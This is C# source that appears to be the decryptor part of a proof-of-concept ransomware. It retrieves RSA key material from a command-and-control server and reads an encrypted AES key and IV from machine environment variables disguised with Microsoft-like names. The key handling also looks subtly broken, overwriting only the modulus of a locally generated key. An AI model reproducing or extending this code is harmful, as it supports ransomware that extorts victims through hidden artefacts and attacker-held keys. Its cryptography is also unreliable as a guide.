using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
using Microsoft.Win32;
namespace PocDecryptor
{
    public static class AsymmetricProtection
    {
        private static string AesKeyEncryptedPlaintext;
        private static readonly Byte[] AesKeyEncryptedInBytes;
        private static RSAParameters PrivateKey;  //will be retrived from the c&c server
        private const string EnvironmentVariableNameKey = "MicrosoftEssentials";
        private const string EnvironmentVariableNameIV = "MicrsoftInitializationVector";
        static AsymmetricProtection()
        {
            Communication Socket = new Communication();
            PrivateKey = RSA.Create().ExportParameters(true);
            PrivateKey.Modulus = Socket.ServerHello();//setting the servers private rsa key
            AesKeyEncryptedPlaintext = Environment.GetEnvironmentVariable(EnvironmentVariableNameKey, EnvironmentVariableTarget.Machine);
            AesKeyEncryptedInBytes = AesEncryption.ConvertStringToByte(AesKeyEncryptedPlaintext);


        }



        public static Byte[] DecryptDataStream(Byte[] Data)               //method for Decrypting the aes key
        {
            try
            {

                RSACryptoServiceProvider Decryptor = new RSACryptoServiceProvider();
                Decryptor.ImportParameters(PrivateKey);
                Byte[] Decrypted = Decryptor.Decrypt(Data, true);
                return Decrypted;

            }
            catch
            {
                Console.WriteLine("An Error while Decrypting aes key");
                return null;
            }

        }
        public static Byte[] GetAesInitializationVector()
        {
            try
            {
                return AesEncryption.ConvertStringToByte(Environment.GetEnvironmentVariable(EnvironmentVariableNameIV, EnvironmentVariableTarget.Machine));
            }
            catch
            {
                Console.WriteLine("An Error while extracting initialization vector");
                return null;
            }

        }
        public static Byte[]GetAesDecryptedKey()
        {
            try
            {
                return DecryptDataStream(AesKeyEncryptedInBytes);
            }
            catch
            {
                Console.WriteLine("An Error when getting aes decrypted key");
                return null;
            }
        }

     















    }
}
